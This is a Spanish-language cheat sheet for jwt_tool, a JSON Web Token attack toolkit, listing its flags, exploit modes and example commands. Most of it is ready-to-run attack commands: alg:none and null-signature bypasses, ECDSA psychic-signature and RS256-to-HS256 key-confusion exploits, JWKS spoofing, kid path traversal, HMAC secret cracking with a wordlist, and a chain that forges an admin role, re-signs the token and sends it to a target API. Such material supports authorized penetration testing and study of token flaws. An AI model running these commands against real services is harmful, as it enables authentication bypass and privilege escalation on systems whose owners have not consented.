# jwt_tool - Referencia

Toolkit para analisis y ataque de JSON Web Tokens. Cracking, tampering, exploits conocidos y escaneo automatizado.

## Instalacion

```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip3 install -r requirements.txt
# Primera ejecucion genera jwtconf.ini, claves y logs
python3 jwt_tool.py
```

## Flags

| Flag | Descripcion |
|------|-------------|
| `[token]` | JWT a testear (primer argumento posicional) |
| `-T` | Tamper mode: editar header y payload interactivamente |
| `-I` | Inject mode: inyectar/modificar claims sin interaccion |
| `-C` | Crack mode: brute force de HMAC secret |
| `-X [exploit]` | Explotar vulnerabilidades conocidas |
| `-S [alg]` | Firmar/re-firmar token con algoritmo especifico |
| `-V` | Verify mode: verificar token con una clave |
| `-M [mode]` | Scanning mode (pb/er/cc/at) |
| `-pk FILE` | Archivo de clave publica (PEM) |
| `-pr FILE` | Archivo de clave privada (PEM) |
| `-jw FILE` | Archivo JWKS |
| `-hc CLAIM` | Header claim a inyectar/modificar |
| `-hv VALUE` | Valor para header claim |
| `-pc CLAIM` | Payload claim a inyectar/modificar |
| `-pv VALUE` | Valor para payload claim |
| `-rc COOKIE` | Cookies para requests |
| `-rh HEADER` | Headers para requests (repetible) |
| `-cv STRING` | Canary value: texto en respuestas validas |
| `-d DICT` | Diccionario para cracking |
| `-t URL` | URL objetivo para enviar token forjado |

## Exploits (-X)

| Modo | Descripcion |
|------|-------------|
| `-X a` | **alg:none** - Eliminar firma, algoritmo a "none" |
| `-X n` | **Null signature** - Mantener alg pero vaciar firma |
| `-X b` | **Blank password** - Probar password vacio |
| `-X p` | **Psychic signature** - ECDSA CVE-2022-21449 |
| `-X s` | **JWKS Spoof** - Crear JWKS falso via jku/x5u |
| `-X k` | **Key confusion** - Firmar con publica usando HMAC (RS->HS) |
| `-X i` | **Inject inline JWKS** - JWK directo en header del token |

## Scanning Modes (-M)

| Modo | Descripcion |
|------|-------------|
| `-M pb` | **Playbook** - Auditoria completa del JWT Attack Playbook |
| `-M er` | **Error** - Fuzz claims para forzar errores |
| `-M cc` | **Common claims** - Fuzz/inyectar nombres de claims comunes |
| `-M at` | **All tests** - Ejecutar todos los modos |

## Algoritmos de Firma (-S)

`hs256`, `hs384`, `hs512`, `rs256`, `rs384`, `rs512`, `es256`, `es384`, `es512`, `ps256`, `ps384`, `ps512`

## Ejemplos Practicos

```bash
# Decodificar e inspeccionar JWT
python3 jwt_tool.py "eyJhbGciOiJIUzI1NiIs..."

# Tamper interactivo
python3 jwt_tool.py "eyJ..." -T

# Inyectar claims (cambiar rol a admin)
python3 jwt_tool.py "eyJ..." -I -pc role -pv admin

# Inyectar multiples claims
python3 jwt_tool.py "eyJ..." -I -pc role -pv admin -pc sub -pv "1"

# Inyectar header claim (kid)
python3 jwt_tool.py "eyJ..." -I -hc kid -hv "../../dev/null"

# Crackear HMAC secret
python3 jwt_tool.py "eyJ..." -C -d /usr/share/wordlists/rockyou.txt

# Ataque alg:none
python3 jwt_tool.py "eyJ..." -X a

# Null signature
python3 jwt_tool.py "eyJ..." -X n

# Key confusion (RS256 -> HS256 con clave publica)
python3 jwt_tool.py "eyJ..." -X k -pk public.pem

# JWKS spoofing
python3 jwt_tool.py "eyJ..." -X s

# Inyectar JWKS inline
python3 jwt_tool.py "eyJ..." -X i

# Firmar con algoritmo y clave especifica
python3 jwt_tool.py "eyJ..." -S hs256 -p "secretkey123"

# Firmar con clave privada RSA
python3 jwt_tool.py "eyJ..." -S rs256 -pr private.pem

# Verificar token
python3 jwt_tool.py "eyJ..." -V -pk public.pem

# Playbook scan contra URL
python3 jwt_tool.py "eyJ..." -M pb -t "https://target.com/api/protected" \
  -rc "jwt=eyJ..." -cv "Welcome"

# Error-based scanning
python3 jwt_tool.py "eyJ..." -M er -t "https://target.com/api" \
  -rh "Authorization: Bearer"

# All tests
python3 jwt_tool.py "eyJ..." -M at -t "https://target.com/api"

# Tamper + re-firmar con secreto conocido
python3 jwt_tool.py "eyJ..." -I -pc admin -pv true -S hs256 -p "weak_secret"

# Chain completa: inyectar admin, firmar, enviar
python3 jwt_tool.py "eyJ..." -I -pc role -pv admin -S hs256 -p "secret" \
  -t "https://target.com/admin" -rh "Authorization: Bearer"
```
